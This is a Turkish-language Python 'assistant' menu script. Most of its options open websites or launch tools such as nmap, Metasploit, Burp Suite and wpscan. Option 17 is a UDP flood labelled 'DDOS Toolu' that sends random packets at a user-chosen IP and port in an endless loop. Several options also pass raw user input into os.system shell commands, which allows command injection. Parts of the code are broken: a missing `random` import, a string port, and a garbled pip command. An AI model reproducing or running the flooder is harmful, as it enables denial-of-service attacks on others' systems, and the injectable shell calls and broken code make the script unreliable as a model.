import webbrowser
import webbrowser
from bs4 import BeautifulSoup
import urllib.request
import os
import hashlib
import socket
import requests
import feedparser
import colorama
from colorama import Fore, Back, Style, init
import wikipedia

print("-------------------------------------------------")
print("                                                 ")
print("             HAWK ASİSTAN TOOLU                  ")
print("                                                 ")
print("-------------------------------------------------")
print()
print("1.Youtube'u Aç")
print("2.Google'u Aç")
print("3.Gmail'i Aç")
print("4.İnstagram'ı Aç")
print("5.Twitter'ı Aç")
print("6.Github'ı Aç")
print("7.Facebook'u Aç")
print("8.Twitch'ı Aç")
print("9.Dlive'ı Aç")
print("10.Eba'ı Aç")
print("11.Yandex'de Arama Yap: ")
print("12.Hava Durumunu Görüntüle ")
print("13.Dosya Aç ")
print("14.Bana MD5 Üret  ")
print("15.Site İp Adresi Görüntüle  ")
print("16.Sayfa Kaynak Kodu Görüntüle ")
print("17.DDOS Toolu Aç  ")
print("18.Metasploit Aç  ")
print("19.NMAP İle Port Tara  ")
print("20.Whois Çekme")
print("21.Online Ansiklopedi'de Arama Yap")
print("22.Haberleri Aç ")
print("23.İnstagram İhlal Forumu Aç ")
print("24.Site Adresi Aç")
print("25.Spotify Aç")
print("26.Terminal ve Sistem Güncelle")
print("27.PİP Güncelle ")
print("28.PİP Paketi Kur ")
print("29.BurpSuite Aç")
print("30.Owasp-Zap Aç")
print("31.WpScan Aç")
print("32.jSQL Aç")
asistan = input("Ne Yapmamı İstersin : ")
    
if asistan =="1":
    k = input("YouTube'da Aramak İstediğiniz Video :")
    webbrowser.open("https://youtube.com/results?search_query=" + k)
if asistan =="2":
    webbrowser.open("https://google.com")

if asistan =="3":
    webbrowser.open("https://www.google.com/gmail/")

if asistan =="4":
    webbrowser.open("https://instagram.com")

if asistan =="5":
    webbrowser.open("https://twitter.com")

if asistan =="6":
    webbrowser.open("https://github.com")
    
if asistan =="7":
    webbrowser.open("https://facebook.com")

if asistan =="8":
    webbrowser.open("https://www.twitch.tv/")

if asistan =="9":
    webbrowser.open("https://dlive.tv/")

if asistan =="10":
    webbrowser.open("https://giris.eba.gov.tr/EBA_GIRIS/giris.jsp")
    
if asistan =="11":
    k = input("Arama Yapmak İstediğiniz Kelime: ")
    webbrowser.open("https://yandex.com.tr/search/?lr=11508&text=" + k)
    
if asistan =="12":
    webbrowser.open("https://yandex.com.tr/search/?lr=11508&text=Hava Durumu")

if asistan =="13":
    d = input("Dosya Adı : ")
    dosya = open(d)

if asistan =="14": 
    user = input("YAZIYI GİR :  ")
    h = hashlib.md5(user.encode())
    h2 = h.hexdigest()
    print(h2)

if asistan =="15":
    dom = input("Site Adresi Giriniz : ")
    print(socket.gethostbyname(dom))

if asistan =="16":
    url = input("(example:https://www.google.com)URL : ")
    r = requests.get(url)
    txt = r.text
    print(txt)

if asistan =="17":

    hedef_ip = input(Fore.RED + "hedef ip: ")
    hedef_port = input(Fore.RED + "hedef port: ")

    bytes = random._urandom(10000)
    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)

    sayac = 0
    while True:
        
        sock.sendto(bytes, (hedef_ip, hedef_port))
        sayac = sayac+1
        print(Fore.GREEN + "saldiri baslatildi,gonderilen paket:%s" % (sayac))
        
if asistan =="18":
    os.system("msfconsole")

if asistan =="19":
    l = input("Portu Taranıcak İp Adresi Yada Site Adresi(goole.com): ")
    os.system("nmap " + l)

if asistan =="20":
    l = input("Site Adresi (google.com): ")
    os.system("whois " + l)

if asistan =="21":
    l = input("WikiPedia'da Aramak İstediğiniz Şey : ")
    result = wikipedia.page(l)
    print(result.summary)
    
if asistan =="22":
    webbrowser.open("https://flipboard.com/")

if asistan =="23":
    webbrowser.open("https://tr-tr.facebook.com/help/instagram/contact/383679321740945")

if asistan =="24":
    f = input("Site Adresi (https://site.com): ")
    webbrowser.open(f)

if asistan =="25":
    webbrowser.open("https://spotify.com")

if asistan =="26":
    os.system(" sudo apt-get upgrade && sudo apt-get update ")
    
if asistan =="27":
    os.system("python - m pip install - -upgrade pip")

if asistan =="28":
    n = input("Paket Adı : ")
    os.system("pip install " + n )
    
if asistan =="29":
    os.system("burpsuite")
    
if asistan =="30":
    os.system("owasp-zap")
    
if asistan =="31":
    os.system("wpscan")
    
if asistan =="32":
    os.system("jsql")